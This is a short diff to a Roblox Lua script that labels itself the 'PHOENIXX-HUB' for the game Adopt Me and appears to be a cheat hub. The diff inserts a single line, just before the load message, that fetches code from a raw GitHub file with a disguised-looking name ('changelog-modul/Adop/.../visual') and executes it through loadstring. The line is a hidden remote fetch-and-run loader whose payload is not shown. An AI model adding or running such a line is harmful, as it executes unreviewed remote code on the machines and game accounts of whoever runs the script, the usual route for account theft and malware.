@@ -313,4 +313,6 @@ Players.PlayerAdded:Connect(function(p)
     end
 end)
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/changelog-modul/Adop/refs/heads/main/visual", true))()
+
 print("[Script PHOENIXX-HUB] Adopt Me Loaded")
